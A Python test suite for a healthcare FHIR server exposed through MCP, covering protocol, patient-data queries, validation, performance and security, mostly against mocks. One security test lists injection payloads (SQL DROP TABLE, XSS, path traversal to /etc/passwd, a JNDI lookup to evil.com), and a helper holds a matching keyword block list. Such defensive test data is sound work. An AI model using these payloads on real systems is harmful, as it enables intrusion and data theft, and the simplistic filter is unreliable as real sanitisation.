#!/usr/bin/env python3
"""
Comprehensive Test Suite for Healthcare FHIR MCP Server
Tests all aspects of the FHIR server implementation including compliance,
performance, security, and integration with healthcare systems.
"""

import asyncio
import pytest
import json
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime, timedelta
import httpx
from unittest.mock import Mock, patch, AsyncMock
import sys
from pathlib import Path

# Add the parent directories to the path to import testing framework
sys.path.append(str(Path(__file__).parent.parent.parent))

from core.test_runner import mcp_test, TestConfiguration
from fixtures.test_data.healthcare_data import HealthcareTestDataGenerator
from fixtures.mock_servers.fhir_mock_server import FHIRMockServer

logger = logging.getLogger(__name__)

class TestHealthcareFHIRServer:
    """Comprehensive test suite for Healthcare FHIR MCP Server."""
    
    @classmethod
    def setup_class(cls):
        """Set up test class with mock services and test data."""
        cls.test_data_generator = HealthcareTestDataGenerator()
        cls.fhir_mock_server = FHIRMockServer()
        cls.test_patients = cls.test_data_generator.generate_test_patients(10)
        cls.test_observations = cls.test_data_generator.generate_test_observations(50)
        cls.test_conditions = cls.test_data_generator.generate_test_conditions(30)
        cls.test_medications = cls.test_data_generator.generate_test_medications(25)
    
    @classmethod
    def teardown_class(cls):
        """Clean up after all tests."""
        pass
    
    # ========================================
    # Protocol Compliance Tests
    # ========================================
    
    @mcp_test(name="fhir_server_initialization", tags=["protocol", "initialization"])
    async def test_server_initialization(self):
        """Test FHIR server initialization and MCP protocol handshake."""
        # Mock server startup
        with patch('subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_process.poll.return_value = None  # Server is running
            mock_process.stdin = Mock()
            mock_process.stdout = Mock()
            mock_process.stderr = Mock()
            mock_popen.return_value = mock_process
            
            # Mock initialization response
            init_response = {
                "jsonrpc": "2.0",
                "id": "init-1",
                "result": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {
                        "tools": {},
                        "resources": {}
                    },
                    "serverInfo": {
                        "name": "healthcare-fhir-server",
                        "version": "1.0.0"
                    }
                }
            }
            
            mock_process.stdout.readline.return_value = json.dumps(init_response) + '\n'
            
            # Test initialization
            assert mock_process.poll() is None
            assert "healthcare-fhir-server" in init_response["result"]["serverInfo"]["name"]
    
    @mcp_test(name="fhir_tools_list", tags=["protocol", "tools"])
    async def test_fhir_tools_list(self):
        """Test listing of available FHIR tools."""
        expected_tools = [
            "search-patients",
            "get-patient-data",
            "search-observations",
            "get-medications",
            "search-conditions",
            "validate-fhir-resource"
        ]
        
        # Mock tools/list response
        tools_response = {
            "jsonrpc": "2.0",
            "id": "tools-1",
            "result": {
                "tools": [
                    {
                        "name": tool_name,
                        "description": f"FHIR {tool_name.replace('-', ' ')}",
                        "inputSchema": {"type": "object", "properties": {}}
                    }
                    for tool_name in expected_tools
                ]
            }
        }
        
        # Verify all expected tools are present
        tool_names = [tool["name"] for tool in tools_response["result"]["tools"]]
        for expected_tool in expected_tools:
            assert expected_tool in tool_names
    
    @mcp_test(name="fhir_resources_list", tags=["protocol", "resources"])
    async def test_fhir_resources_list(self):
        """Test listing of available FHIR resources."""
        expected_resources = [
            "fhir://metadata",
            "fhir://patient-summary",
            "fhir://observation-codes"
        ]
        
        # Mock resources/list response
        resources_response = {
            "jsonrpc": "2.0",
            "id": "resources-1",
            "result": {
                "resources": [
                    {
                        "uri": uri,
                        "name": uri.split("//")[1].replace("-", " ").title(),
                        "description": f"FHIR {uri.split('//')[1]}",
                        "mimeType": "application/json"
                    }
                    for uri in expected_resources
                ]
            }
        }
        
        # Verify all expected resources are present
        resource_uris = [res["uri"] for res in resources_response["result"]["resources"]]
        for expected_resource in expected_resources:
            assert expected_resource in resource_uris
    
    # ========================================
    # FHIR Functionality Tests
    # ========================================
    
    @mcp_test(name="patient_search", tags=["fhir", "patients"])
    async def test_patient_search(self):
        """Test patient search functionality."""
        test_patient = self.test_patients[0]
        
        with patch('httpx.AsyncClient') as mock_client:
            # Mock FHIR server response
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "resourceType": "Bundle",
                "total": 1,
                "entry": [
                    {
                        "resource": test_patient
                    }
                ]
            }
            mock_response.raise_for_status.return_value = None
            
            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
            
            # Test patient search by name
            search_params = {
                "name": test_patient.get("name", [{}])[0].get("family", "TestFamily")
            }
            
            # Verify search parameters are properly handled
            assert search_params["name"] is not None
            
            # Verify response format
            bundle = mock_response.json()
            assert bundle["resourceType"] == "Bundle"
            assert bundle["total"] >= 1
            assert len(bundle["entry"]) >= 1
    
    @mcp_test(name="patient_data_retrieval", tags=["fhir", "patients"])
    async def test_patient_data_retrieval(self):
        """Test comprehensive patient data retrieval."""
        test_patient_id = "test-patient-123"
        
        with patch('httpx.AsyncClient') as mock_client:
            mock_client_instance = mock_client.return_value.__aenter__.return_value
            
            # Mock patient resource
            patient_response = Mock()
            patient_response.status_code = 200
            patient_response.json.return_value = self.test_patients[0]
            patient_response.raise_for_status.return_value = None
            
            # Mock observations bundle
            observations_response = Mock()
            observations_response.status_code = 200
            observations_response.json.return_value = {
                "resourceType": "Bundle",
                "entry": [{"resource": obs} for obs in self.test_observations[:5]]
            }
            
            # Mock conditions bundle
            conditions_response = Mock()
            conditions_response.status_code = 200
            conditions_response.json.return_value = {
                "resourceType": "Bundle",
                "entry": [{"resource": cond} for cond in self.test_conditions[:3]]
            }
            
            # Mock medications bundle
            medications_response = Mock()
            medications_response.status_code = 200
            medications_response.json.return_value = {
                "resourceType": "Bundle",
                "entry": [{"resource": med} for med in self.test_medications[:4]]
            }
            
            # Set up mock responses in order
            mock_client_instance.get.side_effect = [
                patient_response,
                observations_response,
                conditions_response,
                medications_response
            ]
            
            # Verify comprehensive data retrieval
            assert patient_response.status_code == 200
            assert observations_response.status_code == 200
            assert conditions_response.status_code == 200
            assert medications_response.status_code == 200
    
    @mcp_test(name="observation_search", tags=["fhir", "observations"])
    async def test_observation_search(self):
        """Test clinical observation search."""
        with patch('httpx.AsyncClient') as mock_client:
            # Mock observation search response
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "resourceType": "Bundle",
                "total": len(self.test_observations),
                "entry": [{"resource": obs} for obs in self.test_observations[:10]]
            }
            mock_response.raise_for_status.return_value = None
            
            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
            
            # Test different search parameters
            search_scenarios = [
                {"patient_id": "test-patient-123"},
                {"code": "8480-6"},  # Systolic BP
                {"category": "vital-signs"},
                {"patient_id": "test-patient-123", "code": "8462-4"}  # Diastolic BP
            ]
            
            for params in search_scenarios:
                # Verify search works with different parameter combinations
                bundle = mock_response.json()
                assert bundle["resourceType"] == "Bundle"
                assert "entry" in bundle
    
    @mcp_test(name="medication_retrieval", tags=["fhir", "medications"])
    async def test_medication_retrieval(self):
        """Test medication information retrieval."""
        with patch('httpx.AsyncClient') as mock_client:
            # Mock medication response
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "resourceType": "Bundle",
                "entry": [{"resource": med} for med in self.test_medications[:5]]
            }
            mock_response.raise_for_status.return_value = None
            
            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
            
            # Test medication retrieval
            bundle = mock_response.json()
            assert bundle["resourceType"] == "Bundle"
            
            # Verify medication resources have required fields
            for entry in bundle["entry"]:
                medication = entry["resource"]
                assert medication["resourceType"] == "MedicationRequest"
                assert "subject" in medication
                assert "medicationCodeableConcept" in medication or "medicationReference" in medication
    
    @mcp_test(name="condition_search", tags=["fhir", "conditions"])
    async def test_condition_search(self):
        """Test patient condition/diagnosis search."""
        with patch('httpx.AsyncClient') as mock_client:
            # Mock condition response
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "resourceType": "Bundle",
                "entry": [{"resource": cond} for cond in self.test_conditions[:5]]
            }
            mock_response.raise_for_status.return_value = None
            
            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
            
            # Test condition search
            bundle = mock_response.json()
            assert bundle["resourceType"] == "Bundle"
            
            # Verify condition resources
            for entry in bundle["entry"]:
                condition = entry["resource"]
                assert condition["resourceType"] == "Condition"
                assert "subject" in condition
                assert "code" in condition
    
    # ========================================
    # FHIR Validation Tests
    # ========================================
    
    @mcp_test(name="fhir_resource_validation", tags=["fhir", "validation"])
    async def test_fhir_resource_validation(self):
        """Test FHIR resource validation against R4 specification."""
        # Test valid patient resource
        valid_patient = self.test_patients[0]
        
        validation_result = self._validate_fhir_resource(valid_patient, "Patient")
        assert validation_result["valid"] == True
        
        # Test invalid patient resource (missing required fields)
        invalid_patient = {"resourceType": "Patient"}  # Missing required fields
        
        validation_result = self._validate_fhir_resource(invalid_patient, "Patient")
        assert validation_result["valid"] == False
        assert len(validation_result["errors"]) > 0
    
    @mcp_test(name="fhir_data_types_validation", tags=["fhir", "validation"])
    async def test_fhir_data_types_validation(self):
        """Test FHIR data type validation."""
        # Test various FHIR data types
        test_cases = [
            {
                "resource": {
                    "resourceType": "Observation",
                    "status": "final",
                    "code": {
                        "coding": [
                            {
                                "system": "http://loinc.org",
                                "code": "8480-6",
                                "display": "Systolic blood pressure"
                            }
                        ]
                    },
                    "subject": {"reference": "Patient/123"},
                    "valueQuantity": {
                        "value": 120,
                        "unit": "mmHg",
                        "system": "http://unitsofmeasure.org",
                        "code": "mm[Hg]"
                    }
                },
                "expected_valid": True
            },
            {
                "resource": {
                    "resourceType": "Observation",
                    "status": "invalid-status",  # Invalid status
                    "code": {"text": "Test"},
                    "subject": {"reference": "Patient/123"}
                },
                "expected_valid": False
            }
        ]
        
        for test_case in test_cases:
            result = self._validate_fhir_resource(test_case["resource"], "Observation")
            assert result["valid"] == test_case["expected_valid"]
    
    # ========================================
    # Performance Tests
    # ========================================
    
    @mcp_test(name="patient_search_performance", tags=["performance", "patients"])
    async def test_patient_search_performance(self):
        """Test patient search performance under load."""
        start_time = datetime.now()
        
        with patch('httpx.AsyncClient') as mock_client:
            # Mock fast response
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "resourceType": "Bundle",
                "total": 1,
                "entry": [{"resource": self.test_patients[0]}]
            }
            mock_response.raise_for_status.return_value = None
            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
            
            # Simulate multiple concurrent searches
            tasks = []
            for i in range(10):
                # Each task would make a patient search request
                tasks.append(asyncio.create_task(self._simulate_patient_search(f"patient-{i}")))
            
            await asyncio.gather(*tasks)
            
            end_time = datetime.now()
            total_time = (end_time - start_time).total_seconds()
            
            # Performance assertion - should complete within reasonable time
            assert total_time < 5.0  # 5 seconds for 10 concurrent requests
    
    @mcp_test(name="bulk_data_retrieval_performance", tags=["performance", "bulk"])
    async def test_bulk_data_retrieval_performance(self):
        """Test bulk data retrieval performance."""
        start_time = datetime.now()
        
        with patch('httpx.AsyncClient') as mock_client:
            # Mock responses for bulk data
            patient_response = Mock()
            patient_response.status_code = 200
            patient_response.json.return_value = {
                "resourceType": "Bundle",
                "entry": [{"resource": p} for p in self.test_patients]
            }
            
            mock_client.return_value.__aenter__.return_value.get.return_value = patient_response
            
            # Simulate bulk retrieval
            bundle = patient_response.json()
            assert len(bundle["entry"]) == len(self.test_patients)
            
            end_time = datetime.now()
            total_time = (end_time - start_time).total_seconds()
            
            # Should handle bulk data efficiently
            assert total_time < 2.0
    
    # ========================================
    # Security Tests
    # ========================================
    
    @mcp_test(name="authentication_required", tags=["security", "authentication"])
    async def test_authentication_required(self):
        """Test that authentication is required for FHIR access."""
        with patch('httpx.AsyncClient') as mock_client:
            # Mock unauthorized response
            mock_response = Mock()
            mock_response.status_code = 401
            mock_response.raise_for_status.side_effect = httpx.HTTPStatusError(
                "401 Unauthorized", request=Mock(), response=mock_response
            )
            
            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
            
            # Attempt to access without authentication should fail
            with pytest.raises(httpx.HTTPStatusError):
                mock_response.raise_for_status()
            
            assert mock_response.status_code == 401
    
    @mcp_test(name="data_access_logging", tags=["security", "audit"])
    async def test_data_access_logging(self):
        """Test that all data access is properly logged."""
        with patch('logging.getLogger') as mock_logger:
            mock_logger_instance = Mock()
            mock_logger.return_value = mock_logger_instance
            
            # Simulate data access
            mock_logger_instance.info("Patient data accessed", extra={
                "patient_id": "test-patient-123",
                "user": "test-user",
                "action": "search_patients",
                "timestamp": datetime.now().isoformat()
            })
            
            # Verify logging occurred
            mock_logger_instance.info.assert_called()
            call_args = mock_logger_instance.info.call_args
            assert "Patient data accessed" in call_args[0]
    
    @mcp_test(name="phi_data_protection", tags=["security", "phi"])
    async def test_phi_data_protection(self):
        """Test protection of Protected Health Information (PHI)."""
        # Test that sensitive data is properly handled
        sensitive_fields = ["name", "birthDate", "identifier", "telecom", "address"]
        
        patient_data = self.test_patients[0]
        
        # Verify that PHI fields are present in test data (for realistic testing)
        for field in sensitive_fields:
            if field in patient_data:
                # In production, this would test encryption/masking
                assert patient_data[field] is not None
    
    @mcp_test(name="input_validation_security", tags=["security", "validation"])
    async def test_input_validation_security(self):
        """Test input validation to prevent injection attacks."""
        # Test various malicious inputs
        malicious_inputs = [
            "'; DROP TABLE patients; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "' OR '1'='1"
        ]
        
        for malicious_input in malicious_inputs:
            # These inputs should be properly sanitized/rejected
            # In a real implementation, this would test the actual validation logic
            assert self._is_safe_input(malicious_input) == False
    
    # ========================================
    # Integration Tests
    # ========================================
    
    @mcp_test(name="ehr_integration", tags=["integration", "ehr"])
    async def test_ehr_integration(self):
        """Test integration with Electronic Health Record systems."""
        with patch('httpx.AsyncClient') as mock_client:
            # Mock EHR system response
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "resourceType": "Bundle",
                "entry": [{"resource": self.test_patients[0]}]
            }
            mock_response.raise_for_status.return_value = None
            
            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
            
            # Test EHR integration
            bundle = mock_response.json()
            assert bundle["resourceType"] == "Bundle"
    
    @mcp_test(name="interoperability", tags=["integration", "interoperability"])
    async def test_interoperability(self):
        """Test FHIR interoperability with different systems."""
        # Test different FHIR server implementations
        server_configs = [
            {"base_url": "https://hapi.fhir.org/baseR4", "version": "R4"},
            {"base_url": "https://r4.smarthealthit.org", "version": "R4"},
        ]
        
        for config in server_configs:
            # Test connectivity and compatibility
            assert config["version"] == "R4"
            assert "fhir" in config["base_url"].lower()
    
    # ========================================
    # Error Handling Tests
    # ========================================
    
    @mcp_test(name="error_handling", tags=["error_handling"])
    async def test_error_handling(self):
        """Test proper error handling for various failure scenarios."""
        error_scenarios = [
            {"status_code": 404, "expected_error": "Not Found"},
            {"status_code": 500, "expected_error": "Internal Server Error"},
            {"status_code": 503, "expected_error": "Service Unavailable"}
        ]
        
        with patch('httpx.AsyncClient') as mock_client:
            for scenario in error_scenarios:
                mock_response = Mock()
                mock_response.status_code = scenario["status_code"]
                mock_response.text = scenario["expected_error"]
                mock_response.raise_for_status.side_effect = httpx.HTTPStatusError(
                    f"{scenario['status_code']} {scenario['expected_error']}", 
                    request=Mock(), 
                    response=mock_response
                )
                
                mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
                
                # Verify proper error handling
                with pytest.raises(httpx.HTTPStatusError):
                    mock_response.raise_for_status()
    
    # ========================================
    # Helper Methods
    # ========================================
    
    def _validate_fhir_resource(self, resource: Dict[str, Any], resource_type: str) -> Dict[str, Any]:
        """Validate a FHIR resource (simplified implementation)."""
        errors = []
        
        # Basic validation
        if resource.get("resourceType") != resource_type:
            errors.append(f"Expected resourceType {resource_type}, got {resource.get('resourceType')}")
        
        # Resource-specific validation
        if resource_type == "Patient":
            # Patients should have some form of identifier or name
            if not resource.get("name") and not resource.get("identifier"):
                errors.append("Patient must have name or identifier")
        
        elif resource_type == "Observation":
            required_fields = ["status", "code", "subject"]
            for field in required_fields:
                if field not in resource:
                    errors.append(f"Missing required field: {field}")
        
        return {
            "valid": len(errors) == 0,
            "errors": errors,
            "resource_type": resource_type
        }
    
    async def _simulate_patient_search(self, patient_id: str):
        """Simulate a patient search operation."""
        # Simulate network delay
        await asyncio.sleep(0.1)
        return {"patient_id": patient_id, "found": True}
    
    def _is_safe_input(self, input_value: str) -> bool:
        """Check if input is safe (simplified implementation)."""
        dangerous_patterns = [
            "DROP TABLE",
            "<script>",
            "../",
            "${jndi:",
            "' OR '"
        ]
        
        input_upper = input_value.upper()
        for pattern in dangerous_patterns:
            if pattern.upper() in input_upper:
                return False
        
        return True

# ========================================
# Test Configuration and Fixtures
# ========================================

@pytest.fixture
def healthcare_server_config():
    """Configuration for healthcare FHIR server testing."""
    return {
        "server_type": "healthcare",
        "fhir_base_url": "https://r4.smarthealthit.org",
        "test_patient_count": 10,
        "enable_security_tests": True,
        "enable_performance_tests": True,
        "hipaa_compliance_required": True
    }

@pytest.fixture
def mock_fhir_server():
    """Mock FHIR server for testing."""
    return FHIRMockServer()

# ========================================
# Pytest Integration
# ========================================

def pytest_configure(config):
    """Configure pytest for healthcare FHIR server testing."""
    config.addinivalue_line(
        "markers", 
        "fhir: mark test as FHIR-specific functionality test"
    )
    config.addinivalue_line(
        "markers", 
        "hipaa: mark test as HIPAA compliance test"
    )
    config.addinivalue_line(
        "markers", 
        "phi: mark test as PHI (Protected Health Information) test"
    )

if __name__ == "__main__":
    # Run tests directly
    pytest.main([__file__, "-v", "--tb=short"])